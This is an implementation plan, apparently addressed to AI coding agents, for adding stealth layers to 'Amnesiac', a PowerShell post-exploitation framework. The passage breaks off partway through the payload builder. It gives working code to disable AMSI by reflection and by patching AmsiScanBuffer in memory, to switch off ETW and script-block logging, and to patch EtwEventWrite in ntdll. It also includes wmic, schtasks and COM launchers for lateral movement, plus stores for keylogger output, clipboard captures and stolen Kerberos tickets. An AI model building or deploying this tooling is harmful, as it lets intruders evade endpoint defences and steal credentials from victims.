# Amnesiac PS-Level Stealth Improvements — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use `superpowers:subagent-driven-development` (recommended) or `superpowers:executing-plans` to implement this plan task-by-task. Steps use checkbox (`- [x]`) syntax for tracking.

**Goal:** Implement Layers 0, 1, 2 (PS-only portions), 3, and 4 of the Amnesiac stealth overhaul entirely in PowerShell — no C# build toolchain required.

**Architecture:** All new helper functions are added at module level (outside `function Amnesiac {}`) so they are directly importable for testing. The `Amnesiac` function calls them. The main while loop gains new command handlers for `diskmode`, `payload`, `engagement`, `psk`, `modules`, `artifacts`, and `save`. The existing `New-StealthScript` is replaced by the new `New-PayloadScript` builder.

**Tech Stack:** PowerShell 5.1+, .NET 4.6.2 BCL (AES, GZip, Reflection), Pester v5 (testing)

**Spec reference:** `docs/superpowers/specs/2026-05-23-amnesiac-stealth-overhaul-design.md`

**This plan covers phases 1–4 of the 10-phase implementation order.**  
Plan 2 (AmnesiacLoader C# assembly, phases 5–10) is a separate document.

---

## File Map

| File | Action | Responsibility |
|------|--------|----------------|
| `Amnesiac.ps1` | Modify | All PS changes — new module-level functions prepended; globals updated; command handlers added in main loop; `New-StealthScript` replaced by `New-PayloadScript` |
| `Tests/Test-AmnesiacHelpers.ps1` | Create | Pester tests for all module-level helper functions |

No other files are touched in this plan.

---

## Insertion points in `Amnesiac.ps1`

| What | Where |
|------|-------|
| New module-level functions | Prepended before `function Amnesiac {` (line 1) |
| `$AmnesiacLoaderB64` constant | Prepended at very top of file, before module-level functions |
| New global variables | Inside `Amnesiac {}`, after line 84 (`$global:ScanModer = $False`) |
| `Initialize-DiskStructure` call | Replaces lines 60–63 (the unconditional folder creation block) |
| `Initialize-ToolCache` call | After global variables init, before `while($true)` loop |
| `Show-OpsecBanner` call | After `Initialize-ToolCache`, before `while($true)` loop |
| New command handlers | Inside `while($true)` loop, before the `if($choice -eq 'exit')` block |
| `New-PayloadScript` call | Replaces calls to `New-StealthScript` inside `Start-Listener` (≈line 1278) and `Start-GListener` |

---

## Task 1: Test Infrastructure Setup

**Files:**
- Create: `Tests/Test-AmnesiacHelpers.ps1`

- [x] **Step 1.1: Verify Pester is available**

```powershell
# Run in PS terminal
Get-Module Pester -ListAvailable | Select-Object Name, Version
```

Expected: Pester 5.x listed. If missing:
```powershell
Install-Module Pester -Force -SkipPublisherCheck
```

- [x] **Step 1.2: Create test file skeleton**

Create `Tests/Test-AmnesiacHelpers.ps1`:

```powershell
#Requires -Version 5.1
# Amnesiac helper function tests — dot-sources Amnesiac.ps1 to get module-level functions
# Run: Invoke-Pester -Path .\Tests\Test-AmnesiacHelpers.ps1 -Output Detailed

$scriptPath = Resolve-Path "$PSScriptRoot\..\Amnesiac.ps1"

Describe "Module-level helpers are importable" {
    BeforeAll {
        # Dot-source to make module-level functions available without entering the interactive loop
        . $scriptPath
    }

    It "Amnesiac.ps1 dot-sources without error" {
        # If dot-source threw, we'd never reach this assertion
        $true | Should -Be $true
    }
}

Describe "Get-AmsiBypassSnippet" {
    BeforeAll { . $scriptPath }

    It "returns non-empty string for 'fail'" {
        $s = Get-AmsiBypassSnippet -Technique 'fail'
        $s | Should -Not -BeNullOrEmpty
    }
    It "fail snippet contains amsiInitFailed" {
        $s = Get-AmsiBypassSnippet -Technique 'fail'
        $s | Should -Match 'amsiIn'
    }
    It "direct snippet contains Add-Type or VP" {
        $s = Get-AmsiBypassSnippet -Technique 'direct'
        $s | Should -Match '(Add-Type|VP)'
    }
    It "pageguard falls back to fail snippet" {
        $s = Get-AmsiBypassSnippet -Technique 'pageguard'
        $s | Should -Match 'amsiIn'
    }
    It "hwbp falls back to fail snippet" {
        $s = Get-AmsiBypassSnippet -Technique 'hwbp'
        $s | Should -Match 'amsiIn'
    }
    It "each technique returns valid parseable PS" {
        foreach ($t in 'fail','direct','pageguard','hwbp') {
            $s = Get-AmsiBypassSnippet -Technique $t
            $errors = $null
            [System.Management.Automation.Language.Parser]::ParseInput($s, [ref]$null, [ref]$errors) | Out-Null
            $errors | Should -BeNullOrEmpty -Because "technique '$t' must produce parseable PS"
        }
    }
}

Describe "Get-EtwBypassSnippet" {
    BeforeAll { . $scriptPath }

    It "returns non-empty string for all techniques" {
        foreach ($t in 'provider','patch','thread') {
            $s = Get-EtwBypassSnippet -Technique $t
            $s | Should -Not -BeNullOrEmpty -Because "technique '$t' must return code"
        }
    }
    It "provider snippet disables PSEtwLogProvider" {
        $s = Get-EtwBypassSnippet -Technique 'provider'
        $s | Should -Match 'PSEtwLog'
    }
    It "patch snippet targets EtwEventWrite" {
        $s = Get-EtwBypassSnippet -Technique 'patch'
        $s | Should -Match 'EtwEventWrite'
    }
}

Describe "Get-SblBypassSnippet" {
    BeforeAll { . $scriptPath }

    It "returns non-empty string" {
        $s = Get-SblBypassSnippet
        $s | Should -Not -BeNullOrEmpty
    }
    It "snippet targets checkScriptBlockLoggingCache" {
        $s = Get-SblBypassSnippet
        $s | Should -Match 'checkScri'
    }
}

Describe "New-PayloadScript" {
    BeforeAll {
        . $scriptPath
        $global:EndMarker  = 'TESTMARK'
        $global:BufferSize = 1024
        $global:PayloadConfig = @{
            Amsi        = 'fail'
            Etw         = 'provider'
            Sbl         = $true
            Launcher    = 'ps'
            Encoding    = 'gzip'
            Jitter      = 'medium'
            Obfuscation = 'medium'
            Keys        = @{}
        }
    }

    It "returns object with InlinePS and FullCommand properties" {
        $r = New-PayloadScript -ComputerName 'target' -PipeName 'testpipe'
        $r.InlinePS    | Should -Not -BeNullOrEmpty
        $r.FullCommand | Should -Not -BeNullOrEmpty
    }
    It "payload does not contain hardcoded #END#" {
        $r = New-PayloadScript -ComputerName 'target' -PipeName 'testpipe'
        $r.RawScript | Should -Not -Match '#END#'
    }
    It "payload contains session EndMarker" {
        $r = New-PayloadScript -ComputerName 'target' -PipeName 'testpipe'
        $r.RawScript | Should -Match 'TESTMARK'
    }
    It "payload contains amsi bypass" {
        $r = New-PayloadScript -ComputerName 'target' -PipeName 'testpipe'
        $r.RawScript | Should -Match 'amsiIn'
    }
    It "server variant includes PipeSecurity" {
        $r = New-PayloadScript -IsServer -PipeName 'testpipe' -SID 'S-1-1-0'
        $r.RawScript | Should -Match 'PipeSecurity'
    }
    It "environment key is prepended when set" {
        $global:PayloadConfig.Keys = @{ Hostname = 'WIN-TARGET01' }
        $r = New-PayloadScript -ComputerName 'target' -PipeName 'testpipe'
        $r.RawScript | Should -Match 'WIN-TARGET01'
        $global:PayloadConfig.Keys = @{}
    }
}

Describe "Get-PayloadLauncher" {
    BeforeAll { . $scriptPath }

    It "ps launcher returns powershell.exe command" {
        $r = Get-PayloadLauncher -Script 'PAYLOAD' -Launcher 'ps'
        $r | Should -Match 'powershell.exe'
        $r | Should -Match 'PAYLOAD'
    }
    It "wmi launcher uses wmic" {
        $r = Get-PayloadLauncher -Script 'PAYLOAD' -Launcher 'wmi'
        $r | Should -Match 'wmic'
    }
    It "schtask launcher uses schtasks" {
        $r = Get-PayloadLauncher -Script 'PAYLOAD' -Launcher 'schtask'
        $r | Should -Match 'schtasks'
    }
    It "com launcher uses MMC20" {
        $r = Get-PayloadLauncher -Script 'PAYLOAD' -Launcher 'com'
        $r | Should -Match 'MMC20'
    }
}

Describe "Initialize-DiskStructure" {
    BeforeAll { . $scriptPath }

    It "creates no folders when DiskMode is false" {
        $global:DiskMode = $false
        $testPath = "C:\Users\Public\Documents\Amnesiac"
        $existed = Test-Path $testPath
        Initialize-DiskStructure
        if (-not $existed) {
            Test-Path $testPath | Should -Be $false
        }
    }
}

Describe "AES pipe encryption helpers" {
    BeforeAll { . $scriptPath }

    It "Protect-PipeMessage and Unprotect-PipeMessage round-trip" {
        $key = [byte[]](1..16)
        $plain = "test command output with special chars: !@#$%"
        $cipher = Protect-PipeMessage -PlainText $plain -Key $key
        $result = Unprotect-PipeMessage -CipherB64 $cipher -Key $key
        $result | Should -Be $plain
    }
    It "cipher is base64 encoded" {
        $key = [byte[]](1..16)
        $cipher = Protect-PipeMessage -PlainText "hello" -Key $key
        { [Convert]::FromBase64String($cipher) } | Should -Not -Throw
    }
    It "two encryptions of same plaintext produce different ciphertext (IV randomness)" {
        $key = [byte[]](1..16)
        $c1 = Protect-PipeMessage -PlainText "hello" -Key $key
        $c2 = Protect-PipeMessage -PlainText "hello" -Key $key
        $c1 | Should -Not -Be $c2
    }
}

Describe "Test-NetworkLogonToken" {
    BeforeAll { . $scriptPath }

    It "returns a boolean" {
        $r = Test-NetworkLogonToken
        $r | Should -BeOfType [bool]
    }
}

Describe "Initialize-ToolCache" {
    BeforeAll { . $scriptPath }

    It "populates ToolCache with at least the core embedded tools" {
        $global:ToolCache = @{}
        Initialize-ToolCache
        # Core tools are always embedded
        $global:ToolCache.Keys | Should -Contain 'SimpleAMSI'
        $global:ToolCache.Keys | Should -Contain 'NETAMSI'
    }
}
```

- [x] **Step 1.3: Run test file to confirm it fails cleanly**

```powershell
Invoke-Pester -Path .\Tests\Test-AmnesiacHelpers.ps1 -Output Detailed
```

Expected: Multiple failures — all the functions (`Get-AmsiBypassSnippet` etc.) don't exist yet. This confirms the test file is wired up correctly.

- [x] **Step 1.4: Commit test skeleton**

```powershell
git add Tests/Test-AmnesiacHelpers.ps1
git commit -m "test: add Pester test skeleton for Amnesiac module-level helpers"
```

---

## Task 2: Module-Level Stubs + Global State

**Files:**
- Modify: `Amnesiac.ps1` (prepend before line 1; add globals after line 84)

- [x] **Step 2.1: Prepend module-level function stubs and AmnesiacLoaderB64 constant**

Insert the following block at the very top of `Amnesiac.ps1`, before `function Amnesiac {`:

```powershell
# ============================================================
# AmnesiacLoader — pre-built C# assembly (base64)
# Updated by AmnesiacLoader/Build.ps1
# ============================================================
$AmnesiacLoaderB64 = ""  # placeholder — populated by Build.ps1

# ============================================================
# MODULE-LEVEL HELPERS
# Defined outside Amnesiac {} so they are directly importable
# for testing (dot-source Amnesiac.ps1, call helpers directly).
# ============================================================

function Get-AmsiBypassSnippet  { param([string]$Technique) throw "Not implemented" }
function Get-EtwBypassSnippet   { param([string]$Technique) throw "Not implemented" }
function Get-SblBypassSnippet   { throw "Not implemented" }
function New-PayloadScript      { param([switch]$IsServer,[string]$ComputerName,[string]$PipeName,[string]$SID,[hashtable]$Config) throw "Not implemented" }
function Get-PayloadLauncher    { param([string]$Script,[string]$Launcher) throw "Not implemented" }
function Initialize-DiskStructure {}
function Initialize-ToolCache   {}
function Send-Module            { param([string]$ToolName,$Writer,$Reader) throw "Not implemented" }
function Test-NetworkLogonToken { return $false }
function Protect-PipeMessage    { param([string]$PlainText,[byte[]]$Key) throw "Not implemented" }
function Unprotect-PipeMessage  { param([string]$CipherB64,[byte[]]$Key) throw "Not implemented" }
function Show-OpsecBanner       {}
```

- [x] **Step 2.2: Add new global variables inside `Amnesiac {}` after line 84**

After `$global:ScanModer = $False` (line 84), insert:

```powershell
    # ---- Stealth overhaul globals ----
    $global:DiskMode       = $false
    $global:AmnesiacArtifacts = @{
        Keylogger   = [System.Collections.Generic.List[string]]::new()
        Screenshots = [System.Collections.Generic.List[byte[]]]::new()
        Downloads   = [System.Collections.Generic.Dictionary[string,byte[]]]::new()
        Clipboard   = [System.Collections.Generic.List[string]]::new()
        TGTs        = [System.Collections.Generic.List[string]]::new()
    }
    $global:ToolCache      = @{}
    $global:EndMarker      = -join ((65..90 + 97..122) | Get-Random -Count 8 | % {[char]$_})
    $global:BufferSize     = @(512, 1024, 2048, 4096) | Get-Random
    $global:PayloadConfig  = @{
        Amsi        = 'pageguard'
        Etw         = 'provider'
        Sbl         = $true
        Launcher    = 'ps'
        Encoding    = 'gzip'
        Jitter      = 'medium'
        Obfuscation = 'high'
        Keys        = @{}
    }
    $global:EngagementProfile = $null
    $global:PSKPhrase         = $null
    $global:PSKBytes          = $null   # 16-byte derived key; $null = unset
    # ---- End stealth overhaul globals ----
```

- [x] **Step 2.3: Run tests — verify dot-source works and stubs are accessible**

```powershell
Invoke-Pester -Path .\Tests\Test-AmnesiacHelpers.ps1 -Output Detailed
```

Expected: `"Module-level helpers are importable"` describe block now passes. Other describes still fail with "Not implemented".

- [x] **Step 2.4: Commit**

```powershell
git add Amnesiac.ps1
git commit -m "feat: add module-level function stubs and stealth overhaul global variables"
```

---

## Task 3: Layer 1 — Disk Elimination

**Files:**
- Modify: `Amnesiac.ps1`

- [x] **Step 3.1: Replace unconditional folder creation with Initialize-DiskStructure**

Replace lines 60–63 (the `$basePath`/`$subfolders` block):
```powershell
# OLD — remove these lines:
$basePath = "C:\Users\Public\Documents\Amnesiac"
$subfolders = @("Clipboard", "Downloads", "History", "Keylogger", "Payloads", "Screenshots", "Scripts", "Monitor_TGTs")
if (-not (Test-Path $basePath)) {New-Item -Path $basePath -ItemType Directory > $null}
$subfolders | ForEach-Object {$subfolderPath = Join-Path -Path $basePath -ChildPath $_;if (-not (Test-Path $subfolderPath)) {New-Item -Path $subfolderPath -ItemType Directory > $null}}
```

Replace with a single call (the function is now at module level, the call goes where the block was):
```powershell
    Initialize-DiskStructure
```

- [x] **Step 3.2: Implement Initialize-DiskStructure at module level**

Replace the `Initialize-DiskStructure {}` stub with:

```powershell
function Initialize-DiskStructure {
    if (-not $global:DiskMode) { return }
    $basePath   = "C:\Users\Public\Documents\Amnesiac"
    $subfolders = @("Clipboard","Downloads","History","Keylogger","Payloads","Screenshots","Scripts","Monitor_TGTs")
    if (-not (Test-Path $basePath)) { New-Item -Path $basePath -ItemType Directory | Out-Null }
    $subfolders | ForEach-Object {
        $p = Join-Path $basePath $_
        if (-not (Test-Path $p)) { New-Item -Path $p -ItemType Directory | Out-Null }
    }
}
```

- [x] **Step 3.3: Add `diskmode` command handler in the main while loop**

In the main `while($true)` loop, before the `if($choice -eq 'exit')` block, add:

```powershell
            if ($choice -match '^diskmode(\s+(on|off))?$') {
                if ($Matches[2] -eq 'on') {
                    $global:DiskMode = $true
                    Initialize-DiskStructure
                    $global:Message = " [+] Disk mode: ON — artifact directories created"
                } elseif ($Matches[2] -eq 'off') {
                    $global:DiskMode = $false
                    $global:Message = " [+] Disk mode: OFF — no disk writes on operator or target"
                } else {
                    $state = if ($global:DiskMode) { "ON" } else { "OFF" }
                    $global:Message = " [+] Disk mode: $state"
                }
                continue
            }
```

Also add a warning when `exe` payload format is selected while disk mode is off. Find the `toggle` command handler (≈line 160) and add after the `exe` case is set:

```powershell
            if ($global:payloadformat -eq 'exe' -and -not $global:DiskMode) {
                $global:Message = " [!] exe format requires disk write. Enable with 'diskmode on' or switch format."
            }
```

- [x] **Step 3.4: Run tests**

```powershell
Invoke-Pester -Path .\Tests\Test-AmnesiacHelpers.ps1 -Output Detailed -Tag "Initialize-DiskStructure"
```

Expected: `"Initialize-DiskStructure"` describe block passes.

- [x] **Step 3.5: Commit**

```powershell
git add Amnesiac.ps1
git commit -m "feat(layer1): disk elimination — conditional folder creation, diskmode command"
```

---

## Task 4: Layer 1 — In-Memory Artifact Store

**Files:**
- Modify: `Amnesiac.ps1`

- [x] **Step 4.1: Add `artifacts` command handler**

In the main loop, add:

```powershell
            if ($choice -match '^artifacts(\s+(keylogger|screenshots|clipboard|tgts|downloads))?$') {
                $type = $Matches[2]
                if (-not $type) {
                    # Show summary
                    Write-Host ""
                    Write-Host " [+] In-memory artifacts:" -ForegroundColor Cyan
                    Write-Host "     Keylogger:   $($global:AmnesiacArtifacts.Keylogger.Count) entries"
                    Write-Host "     Screenshots: $($global:AmnesiacArtifacts.Screenshots.Count) items"
                    Write-Host "     Clipboard:   $($global:AmnesiacArtifacts.Clipboard.Count) entries"
                    Write-Host "     TGTs:        $($global:AmnesiacArtifacts.TGTs.Count) entries"
                    Write-Host "     Downloads:   $($global:AmnesiacArtifacts.Downloads.Count) files"
                    Write-Host ""
                } elseif ($type -eq 'keylogger') {
                    if ($global:AmnesiacArtifacts.Keylogger.Count -eq 0) {
                        $global:Message = " [-] No keylogger data captured."
                    } else {
                        Write-Host ""
                        $global:AmnesiacArtifacts.Keylogger | ForEach-Object { Write-Host $_ }
                        Write-Host ""
                    }
                } elseif ($type -eq 'clipboard') {
                    if ($global:AmnesiacArtifacts.Clipboard.Count -eq 0) {
                        $global:Message = " [-] No clipboard data captured."
                    } else {
                        $global:AmnesiacArtifacts.Clipboard | ForEach-Object { Write-Host $_ }
                    }
                } elseif ($type -eq 'tgts') {
                    $global:AmnesiacArtifacts.TGTs | ForEach-Object { Write-Host $_ }
                } elseif ($type -eq 'downloads') {
                    $global:AmnesiacArtifacts.Downloads.Keys | ForEach-Object {
                        $sz = $global:AmnesiacArtifacts.Downloads[$_].Length
                        Write-Host "  $_ ($sz bytes)"
                    }
                }
                continue
            }
```

- [x] **Step 4.2: Add `save` command handler**

```powershell
            if ($choice -match '^save(\s+(all|keylogger|screenshots|clipboard|tgts|downloads))?(\s+(.+))?$') {
                $type = $Matches[2]
                $path = if ($Matches[4]) { $Matches[4] } else { "$env:USERPROFILE\Desktop\amnesiac-artifacts" }

                if ($type -eq 'all' -or -not $type) {
                    $null = New-Item -Path $path -ItemType Directory -Force
                    if ($global:AmnesiacArtifacts.Keylogger.Count -gt 0) {
                        $global:AmnesiacArtifacts.Keylogger | Out-File "$path\keylogger.txt" -Encoding UTF8
                    }
                    if ($global:AmnesiacArtifacts.Clipboard.Count -gt 0) {
                        $global:AmnesiacArtifacts.Clipboard | Out-File "$path\clipboard.txt" -Encoding UTF8
                    }
                    if ($global:AmnesiacArtifacts.TGTs.Count -gt 0) {
                        $global:AmnesiacArtifacts.TGTs | Out-File "$path\tgts.txt" -Encoding UTF8
                    }
                    $global:AmnesiacArtifacts.Downloads.GetEnumerator() | ForEach-Object {
                        [System.IO.File]::WriteAllBytes("$path\$($_.Key)", $_.Value)
                    }
                    $global:Message = " [+] Artifacts saved to: $path"
                } elseif ($type -eq 'keylogger') {
                    $outFile = if ($Matches[4]) { $Matches[4] } else { "$env:USERPROFILE\Desktop\keylogger.txt" }
                    $global:AmnesiacArtifacts.Keylogger | Out-File $outFile -Encoding UTF8
                    $global:Message = " [+] Keylogger saved to: $outFile"
                } elseif ($type -eq 'downloads') {
                    $null = New-Item -Path $path -ItemType Directory -Force
                    $global:AmnesiacArtifacts.Downloads.GetEnumerator() | ForEach-Object {
                        [System.IO.File]::WriteAllBytes("$path\$($_.Key)", $_.Value)
                    }
                    $global:Message = " [+] Downloads saved to: $path"
                }
                continue
            }
```

- [x] **Step 4.3: Wire artifact capture for keylogger output**

Find where the keylogger output is currently written to disk (search for `Keylogger` in the file). Replace/supplement the disk write with a memory store call:

```powershell
# Find: $result | Out-File "C:\...\Keylogger\..." (or similar)
# Add alongside it (when DiskMode is off, skip disk write):
if ($global:DiskMode) {
    $result | Out-File $keyloggerPath -Encoding UTF8 -Append
} else {
    $global:AmnesiacArtifacts.Keylogger.Add($result)
}
```

Apply the same pattern for clipboard and download captures throughout the session handling code.

- [x] **Step 4.4: Commit**

```powershell
git add Amnesiac.ps1
git commit -m "feat(layer1): in-memory artifact store, artifacts and save commands"
```

---

## Task 5: Layer 0 — AMSI Bypass Snippets

**Files:**
- Modify: `Amnesiac.ps1` (module-level section)

- [x] **Step 5.1: Implement Get-AmsiBypassSnippet**

Replace the stub with:

```powershell
function Get-AmsiBypassSnippet {
    param([string]$Technique = 'pageguard')

    switch ($Technique) {
        'fail' {
            # amsiInitFailed via reflection — no Add-Type, no memory modification
            return "[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.AmsiUt'+'ils').GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue(`$null,`$true)"
        }

        'direct' {
            # Patch AmsiScanBuffer bytes — requires VirtualProtect via obfuscated Add-Type
            # Add-Type itself will be AMSI-scanned; include as option despite catch-22
            $c = -join ((65..90 + 97..122) | Get-Random -Count 8 | % { [char]$_ })
            return (
                "`$_src = @'`n" +
                "using System;`n" +
                "using System.Runtime.InteropServices;`n" +
                "public class $c {`n" +
                "  [DllImport(""kernel32"")]public static extern bool VP(IntPtr a,uint b,uint c,out uint d);`n" +
                "}`n" +
                "'@;" +
                "Add-Type -Td `$_src;" +
                "`$_t=[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.AmsiUt'+'ils');" +
                "`$_fp=`$_t.GetMethod('Sc'+'anContent','NonPublic,Static').MethodHandle.GetFunctionPointer();" +
                "`$_o=0u;" +
                "$c::VP(`$_fp,6u,0x40u,[ref]`$_o)|Out-Null;" +
                "[Runtime.InteropServices.Marshal]::Copy([byte[]](0x48,0x31,0xC0,0xC3),0,`$_fp,4);" +
                "$c::VP(`$_fp,6u,`$_o,[ref]`$_o)|Out-Null"
            )
        }

        { $_ -in 'pageguard','hwbp' } {
            # Full PAGE_GUARD+VEH or hardware-breakpoint technique requires AmnesiacLoader.Bypass (C#).
            # PS payload uses 'fail' fallback. The selected technique activates automatically
            # when 'load loader' is issued in the session (AmnesiacLoader.Bypass::PatchAmsi<X>()).
            return Get-AmsiBypassSnippet -Technique 'fail'
        }

        default {
            return Get-AmsiBypassSnippet -Technique 'fail'
        }
    }
}
```

- [x] **Step 5.2: Run AMSI bypass tests**

```powershell
Invoke-Pester -Path .\Tests\Test-AmnesiacHelpers.ps1 -Output Detailed
```

Expected: `"Get-AmsiBypassSnippet"` describe block (6 tests) all pass.

- [x] **Step 5.3: Commit**

```powershell
git add Amnesiac.ps1
git commit -m "feat(layer0): AMSI bypass snippet catalog (fail, direct, pageguard/hwbp fallback)"
```

---

## Task 6: Layer 0 — ETW and SBL Bypass Snippets

**Files:**
- Modify: `Amnesiac.ps1` (module-level section)

- [x] **Step 6.1: Implement Get-EtwBypassSnippet**

Replace the stub with:

```powershell
function Get-EtwBypassSnippet {
    param([string]$Technique = 'provider')

    switch ($Technique) {
        'provider' {
            # Disable PSEtwLogProvider via reflection — PS-specific, lightweight
            return "[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Trac'+'ing.PSEtwLog'+'Provider').GetField('etwPro'+'vider','NonPublic,Static').GetValue(`$null)|%{[System.Diagnostics.Eventing.EventProvider].GetField('m_en'+'abled','NonPublic,Instance').SetValue(`$_,[Byte]0)}"
        }

        'patch' {
            # Patch EtwEventWrite in ntdll to ret 0 — kills all userland ETW from the process
            $c = -join ((65..90 + 97..122) | Get-Random -Count 8 | % { [char]$_ })
            return (
                "`$_es = @'`n" +
                "using System;`n" +
                "using System.Runtime.InteropServices;`n" +
                "public class $c {`n" +
                "  [DllImport(""kernel32"")]public static extern IntPtr GetModuleHandle(string m);`n" +
                "  [DllImport(""kernel32"")]public static extern IntPtr GetProcAddress(IntPtr h,string p);`n" +
                "  [DllImport(""kernel32"")]public static extern bool VP(IntPtr a,uint b,uint c,out uint d);`n" +
                "}`n" +
                "'@;" +
                "Add-Type -Td `$_es;" +
                "`$_h = $c::GetModuleHandle('ntdll');" +
                "`$_p = $c::GetProcAddress(`$_h,'EtwEventWrite');" +
                "`$_o = 0u;" +
                "$c::VP(`$_p,6u,0x40u,[ref]`$_o)|Out-Null;" +
                "[Runtime.InteropServices.Marshal]::Copy([byte[]](0x48,0x33,0xC0,0xC3),0,`$_p,4);" +
                "$c::VP(`$_p,6u,`$_o,[ref]`$_o)|Out-Null"
            )
        }

        'thread' {
            # Per-thread fallback — reuse provider disable (thread-granular variant needs CLR internals)
            return Get-EtwBypassSnippet -Technique 'provider'
        }

        default {
            return Get-EtwBypassSnippet -Technique 'provider'
        }
    }
}
```

- [x] **Step 6.2: Implement Get-SblBypassSnippet**

Replace the stub with:

```powershell
function Get-SblBypassSnippet {
    # Disable ScriptBlock logging via reflection — single technique, always included
    return "[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Scri'+'ptBlock').GetField('checkScri'+'ptBlockLogg'+'ingCache','NonPublic,Static').SetValue(`$null,[Boolean]`$false)"
}
```

- [x] **Step 6.3: Run ETW/SBL tests**

```powershell
Invoke-Pester -Path .\Tests\Test-AmnesiacHelpers.ps1 -Output Detailed
```

Expected: `"Get-EtwBypassSnippet"` and `"Get-SblBypassSnippet"` describe blocks all pass.

- [x] **Step 6.4: Commit**

```powershell
git add Amnesiac.ps1
git commit -m "feat(layer0): ETW bypass catalog (provider, patch, thread), SBL bypass snippet"
```

---

## Task 7: Layer 2 — Session-Unique EndMarker and BufferSize

**Files:**
- Modify: `Amnesiac.ps1`

The globals `$global:EndMarker` and `$global:BufferSize` were initialized in Task 2. This task fixes the existing `New-StealthScript` to use them, and verifies no payload still contains `#END#`.

- [x] **Step 7.1: Fix existing New-StealthScript to use EndMarker**

Find `New-StealthScript` (≈line 1116). Locate the two occurrences of `'#END#'` inside the `$loop` variable (one in the client variant, one in the server variant). Replace both with the session-unique marker:

```powershell
# OLD (client loop, ≈line 1148):
$loop = "...`$$v3.WriteLine('#END#');`$$v3.Flush()..."

# NEW:
$loop = "...`$$v3.WriteLine('$($global:EndMarker)');`$$v3.Flush()..."
```

```powershell
# OLD (server loop, ≈line 1152):
$loop = "...`$$v3.WriteLine('#END#');`$$v3.Flush()..."

# NEW:
$loop = "...`$$v3.WriteLine('$($global:EndMarker)');`$$v3.Flush()..."
```

Also update the server variant's `NamedPipeServerStream` buffer size arguments from `1028,1028` to `$($global:BufferSize),$($global:BufferSize)`:

```powershell
# OLD (≈line 1151):
# ...-ArgumentList '$PipeName',...,1028,1028,...
# NEW:
# ...-ArgumentList '$PipeName',...,$($global:BufferSize),$($global:BufferSize),...
```

- [x] **Step 7.2: Update InteractWithPipeSession to use EndMarker**

Search the file for all occurrences of `'#END#'` (the operator-side reader that waits for the end marker). Replace each with `$global:EndMarker`:

```powershell
# Pattern to find: while($line -ne '#END#'){ or if($line -eq '#END#'){
# Replace with: while($line -ne $global:EndMarker){ / if($line -eq $global:EndMarker){
```

- [x] **Step 7.3: Run payload builder tests**

```powershell
# Run tests — New-PayloadScript doesn't exist yet so those fail, but verify EndMarker tests pass
Invoke-Pester -Path .\Tests\Test-AmnesiacHelpers.ps1 -Output Detailed
```

Expected: EndMarker tests in `"New-PayloadScript"` describe block still fail (function not implemented), but no regressions in other passing tests.

- [x] **Step 7.4: Commit**

```powershell
git add Amnesiac.ps1
git commit -m "feat(layer2): session-unique EndMarker/BufferSize — replace hardcoded #END# and 1028"
```

---

## Task 8: Layer 2 — New-PayloadScript Builder

**Files:**
- Modify: `Amnesiac.ps1` (module-level section)

This is the core payload builder. It replaces `New-StealthScript`.

- [x] **Step 8.1: Implement New-PayloadScript at module level**

Replace the `New-PayloadScript` stub with the full implementation:

```powershell
function New-PayloadScript {
    param(
        [switch]$IsServer,
        [string]$ComputerName,
        [string]$PipeName,
        [string]$SID,
        [hashtable]$Config = $global:PayloadConfig
    )

    # Variable name length by obfuscation level
    $minLen, $maxLen = switch ($Config.Obfuscation) {
        'low'    { 4, 7 }
        'high'   { 12, 21 }
        default  { 6, 11 }  # medium
    }
    $rnd = { -join ((65..90 + 97..122) | Get-Random -Count (Get-Random -Min $minLen -Max $maxLen) | % { [char]$_ }) }

    # How many string parts for type-name splitting
    $splits = switch ($Config.Obfuscation) {
        'low'  { 2 }; 'high' { 5 }; default { 3 }
    }
    $splitStr = {
        param([string]$s)
        $partLen = [Math]::Ceiling($s.Length / $splits)
        $parts = for ($i = 0; $i -lt $s.Length; $i += $partLen) {
            "'$($s.Substring($i, [Math]::Min($partLen, $s.Length - $i)))'"
        }
        $parts -join '+'
    }

    # Generate unique variable names for every slot
    $vPipe=$(&$rnd); $vRd=$(&$rnd); $vWr=$(&$rnd); $vCmd=$(&$rnd)
    $vRes=$(&$rnd); $vErr=$(&$rnd); $vJ=$(&$rnd); $vT=$(&$rnd)
    $vSec=$(&$rnd); $vSid=$(&$rnd); $vAr=$(&$rnd); $vTm=$(&$rnd)
    $vCb=$(&$rnd); $vGz=$(&$rnd); $vA=$(&$rnd); $vB=$(&$rnd)
    $vC=$(&$rnd); $vD=$(&$rnd)

    # Bypass blocks
    $amsiSnippet = Get-AmsiBypassSnippet -Technique $Config.Amsi
    $etwSnippet  = Get-EtwBypassSnippet  -Technique $Config.Etw
    $sblSnippet  = if ($Config.Sbl) { Get-SblBypassSnippet } else { '' }

    # Jitter block
    $jitter = switch ($Config.Jitter) {
        'off'    { '' }
        'low'    { "`$$vJ=Get-Random -Min 0 -Max 2000;[Threading.Thread]::Sleep(`$$vJ)" }
        'high'   { "`$$vJ=Get-Random -Min 3000 -Max 10000;[Threading.Thread]::Sleep(`$$vJ)" }
        default  { "`$$vJ=Get-Random -Min 1000 -Max 5000;[Threading.Thread]::Sleep(`$$vJ)" }
    }

    # Environment key checks (prepended; failed check = silent exit)
    $keyBlock = ''
    if ($Config.Keys.Hostname) { $keyBlock += "if(`$env:COMPUTERNAME -ne '$($Config.Keys.Hostname)'){exit};" }
    if ($Config.Keys.Domain)   { $keyBlock += "if((Get-WmiObject Win32_ComputerSystem).Domain -ne '$($Config.Keys.Domain)'){exit};" }
    if ($Config.Keys.User)     { $keyBlock += "if(`$env:USERNAME -ne '$($Config.Keys.User)'){exit};" }

    # Marker and buffer (session-unique)
    $marker  = $global:EndMarker
    $bufSize = $global:BufferSize

    # Split type names
    $clientType = (& $splitStr 'System.IO.Pipes.NamedPipeCl') + "+'ientStream'"
    $serverType = (& $splitStr 'System.IO.Pipes.NamedPipeSer') + "+'verStream'"

    # Assembly load block
    $asmLoad = "[void][Reflection.Assembly]::LoadWithPartialName('System.Core')"

    # Module framing handler (embedded in loop — target assembles chunked modules)
    $modVarBuf = & $rnd; $modVarLine = & $rnd; $modVarName = & $rnd
    $moduleHandler = (
        "if(`$$vCmd -match '^__MODULE_BEGIN__:(.+):(\\d+)`$'){" +
